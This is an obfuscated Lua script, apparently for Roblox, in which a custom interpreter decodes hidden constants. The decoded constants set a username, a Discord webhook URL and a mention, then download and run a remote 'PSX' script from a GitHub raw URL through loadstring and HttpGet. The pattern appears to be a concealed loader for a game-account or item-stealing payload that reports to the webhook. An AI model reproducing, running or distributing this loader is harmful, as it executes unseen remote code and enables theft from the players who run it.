do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v75=v2(v0(v30,16));if v19 then local v87=v5(v75,v19);v19=nil;return v87;else return v75;end end end);local function v20(v31,v32,v33)if v33 then local v76=(v31/((2 + 0)^(v32-(1 + 0))))%((633 -(16 + 615))^(((v33-(2 -1)) -(v32-(2 -(1 + 0)))) + 1));return v76-(v76%(1834 -(337 + 1496)));else local v77=((1664 -(1300 + 362)) -0)^(v32-((263 + 553) -(154 + 661)));return (((v31%(v77 + v77))>=v77) and (1 + 0)) or ((969 -(943 + 26)) + 0);end end local function v21()local v38=v1(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v1(v16,v18,v18 + 2);v18=v18 + 1 + 1;return (v40 * (351 -(82 + 13))) + v39;end local function v23()local v41,v42,v43,v44=v1(v16,v18,v18 + (8 -5));v18=v18 + 4;return (v44 * (61486214 -44708998)) + (v43 * (151586 -86050)) + (v42 * (956 -700)) + v41;end local function v24()local v45=v23();local v46=v23();local v47=33 -(13 + 19);local v48=(v20(v46,1940 -(1650 + 289),83 -63) * ((1206 -(431 + 773))^(89 -(954 -(200 + 697))))) + v45;local v49=v20(v46,58 -37,1079 -(398 + 650));local v50=((v20(v46,9 + 23)==(1 + 0)) and  -(2 -1)) or 1;if (v49==0) then if (v48==(0 -0)) then return v50 * 0;else v49=(733 -(411 + 321)) + 0 + 0;v47=0 -0;end elseif (v49==(1192 + 855)) then return ((v48==(0 -(0 + 0))) and (v50 * ((309 -(202 + 106))/(1149 -(774 + 375))))) or (v50 * NaN);end return v8(v50,v49-(2119 -(1678 -(24 + 558)))) * (v47 + (v48/((1436 -(1110 + 324))^(7 + 45))));end local function v25(v34)local v51;if  not v34 then v34=v23();if (v34==0) then return "";end end v51=v3(v16,v18,(v18 + v34) -(636 -(156 + 479)));v18=v18 + v34;local v52={};for v63=1700 -(1183 + 516), #v51 do v52[v63]=v2(v1(v3(v51,v63,v63)));end return v6(v52);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53={};local v54={};local v55={};local v56={v53,v54,nil,v55};local v57=v23();local v58={};for v65=2 -1,v57 do local v66=v21();local v67;if (v66==(1749 -(171 + 1577))) then v67=v21()~=0;elseif (v66==(1260 -(473 + 785))) then v67=v24();elseif (v66~=(233 -(218 + 12))) then else v67=v25();end v58[v65]=v67;end v56[1864 -(1030 + 831)]=v21();for v69=1,v23() do local v70=v21();if (v20(v70,1,1 + 0)==0) then local v83=v20(v70,2,3);local v84=v20(v70,4 + 0,8 -2);local v85={v22(),v22(),nil,nil};if (v83==(1643 -(1485 + 158))) then v85[3]=v22();v85[3 + 1]=v22();elseif (v83==1) then v85[3]=v23();elseif (v83==2) then v85[3]=v23() -((7 -5)^16);elseif (v83~=(2 + 1)) then else v85[3]=v23() -(2^16);v85[217 -(120 + 93)]=v22();end if (v20(v84,1391 -(942 + 448),1)~=(1 + 0)) then else v85[227 -(191 + 34)]=v58[v85[1 + 1]];end if (v20(v84,1 + 1,1 + 1)==(1 + 0)) then v85[3]=v58[v85[10 -7]];end if (v20(v84,4 -1,3)~=(1 + 0)) then else v85[1590 -(588 + 998)]=v58[v85[4]];end v53[v69]=v85;end end for v71=1,v23() do v54[v71-1]=v28();end for v73=1,v23() do v55[v73]=v23();end return v56;end local function v29(v35,v36,v37)local v60=v35[1];local v61=v35[2];local v62=v35[3];return function(...)local v78=1;local v79= -1;local v80={...};local v81=v12("#",...) -1;local function v82()local v88=v60;local v89=v61;local v90=v62;local v91=v27;local v92={};local v93={};local v94={};for v107=0,v81 do if ((v107>=v90) or ((4626 -2180)==(6469 -3354))) then v92[v107-v90]=v80[v107 + 1 + (1829 -(1818 + 11))];else v94[v107]=v80[v107 + (897 -(112 + 35 + 749))];end end local v95=(v81-v90) + 1;local v96;local v97;while true do v96=v88[v78];v97=v96[1314 -(125 + 1188)];if ((v97<=(1 + 2)) or (403<=400)) then if ((v97<=(1 + 0 + 0)) or (1661<(770 -563))) then if ((v97>(0 -(1642 -(958 + 684)))) or ((4768 -(1578 + 167))<=((3181 -(788 + 560)) -(859 + 25)))) then v94[v96[1 + 1]]();else local v118=v96[1 + 1];local v119=v94[v96[1 + 2]];v94[v118 + 1 + 0]=v119;v94[v118]=v119[v96[4]];end elseif ((v97==((2860 -1532) -(425 + 901))) or ((188 + 239)<((3219 -2400) -(209 + 310)))) then v94[v96[2]]=v96[1947 -((1024 -(406 + 299)) + (3368 -1743))]~=0;else v37[v96[3]]=v94[v96[2]];end elseif (((2566 -876)>(2506 -1286)) and (v97<=(18 -13))) then if ((v97>(4 + (1935 -(1864 + 71)))) or ((646 + 777)>(5544 -(11665 -9027)))) then local v126=v96[2 -0];v94[v126]=v94[v126](v13(v94,v126 + 1 + 0,v79));else v94[v96[1424 -(843 + 579)]]=v96[1 + 2];end elseif ((v97<=(25 -19)) or ((250 + 1310)==(16208 -12405))) then v94[v96[5 -3]]=v37[v96[3 + 0]];elseif ((v97>(4 + 3)) or ((3022 -(2144 -(33 + 87)))>((6507 + 3991) -6915))) then local v132=v96[2 + (0 -0)];local v133,v134=v91(v94[v132](v13(v94,v132 + (4 -3),v96[6 -3])));v79=(v134 + v132) -(1 + 0);local v135=0 + 0;for v136=v132,v79 do v135=v135 + 1;v94[v136]=v133[v135];end else do return;end end v78=v78 + 1;end end A,B=v27(v11(v82));if  not A[1] then local v98=v35[4][v78] or "?";error("Script error at ["   .. v98   .. "]:"   .. A[2]);else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!093O0003083O00557365724E616D65030C3O00656D2O70755F712O467A6B6703073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31302O36383137392O353335323032373135362F6E4B4C516C57714D67424F666C714C6F454C706F5769782O4F474C486B30356148584A415F45596F4F335A2O306C6578367255484D76325A5045474D695758712O54695103073O004D656E74696F6E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403403O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F5363726970742E6C7561000F3O0012043O00023O0012033O00013O0012043O00043O0012033O00034O00023O00013O0012033O00053O0012063O00063O001206000100073O00202O000100010008001204000300094O0002000400014O0008000100044O00055O00022O00013O000100012O00073O00017O000F3O00023O00023O00033O00033O00043O00043O00053O00053O00053O00053O00053O00053O00053O00053O00063O00",v9(),...);end
